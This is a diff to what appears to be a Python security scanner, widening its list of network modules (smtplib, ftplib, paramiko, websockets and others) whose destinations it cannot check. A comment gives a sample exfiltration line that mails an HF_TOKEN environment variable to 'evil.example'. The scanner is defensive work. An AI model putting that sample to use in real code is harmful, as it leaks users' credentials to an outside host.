@@ -339,7 +339,16 @@ SENSITIVE_MODULES = frozenset(("os", "requests", "httpx", "urllib", "socket"))
 # the method names cannot see. urllib.parse is deliberately absent: it is string
 # manipulation, RE_NETWORK excludes it for the same reason, and upstream's
 # utility.py imports urlparse from it twice.
-UNVOUCHABLE_MODULES = ("socket", "http.client", "http.server", "urllib.request")
+# Clients whose destination is a bare host rather than a URL this can read, so
+# no walk over the literals can say where they send. smtplib.SMTP(
+# "evil.example").sendmail(..., os.environ["HF_TOKEN"]) is a whole exfiltration
+# beside an honest hub download. requests, httpx and aiohttp are deliberately
+# absent: they take a URL, which this reads.
+UNVOUCHABLE_MODULES = (
+    "socket", "http.client", "http.server", "urllib.request",
+    "smtplib", "ftplib", "poplib", "imaplib", "nntplib", "telnetlib",
+    "xmlrpc.client", "paramiko", "pysftp", "websocket", "websockets",
+)
 
 # The same door for the string builders. RE_UNVOUCHABLE_STRING_BUILD reads
 # qualified spellings, so `from base64 import b64decode as d` left it nothing to
